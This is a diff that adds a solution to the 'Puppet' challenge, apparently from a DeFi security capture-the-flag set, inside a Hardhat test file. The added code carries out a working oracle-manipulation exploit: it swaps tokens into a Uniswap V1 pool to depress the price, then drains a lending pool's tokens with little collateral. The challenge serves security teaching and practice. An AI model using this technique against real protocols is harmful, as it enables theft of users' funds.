@@ -4,6 +4,7 @@ const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 const { setBalance } = require("@nomicfoundation/hardhat-network-helpers");
+const { days, minutes } = require("@nomicfoundation/hardhat-network-helpers/dist/src/helpers/time/duration");
 
 // Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
 function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
@@ -95,6 +96,33 @@ describe('[Challenge] Puppet', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        console.log("player token balance before: ", await token.balanceOf(player.address));
+
+        // player approve uniswap to spend its tokens
+        await token.connect(player).approve(uniswapExchange.address, PLAYER_INITIAL_TOKEN_BALANCE);
+
+        // player buys almost all uniswap eth using its tokens
+        // that will lower token price on uniswap
+        const tx = await uniswapExchange.connect(player).tokenToEthSwapOutput(
+            ethers.utils.parseEther("9.9"),
+            PLAYER_INITIAL_TOKEN_BALANCE,
+            (await ethers.provider.getBlock('latest')).timestamp * 2,
+            { gasLimit: 1e6 }
+        );
+        await tx.wait();
+
+        // calculate required amount of collateral to borrow pool's tokens
+        const depositRequired = await lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        expect(depositRequired < PLAYER_INITIAL_ETH_BALANCE).to.be.true;
+        
+        // borrow pool's tokens at the lower price
+        await lendingPool.borrow(
+            POOL_INITIAL_TOKEN_BALANCE,
+            player.address,
+            { value: depositRequired }
+        );
+
+        console.log("player token balance after: ", await token.balanceOf(player.address));
     });
 
     after(async function () {
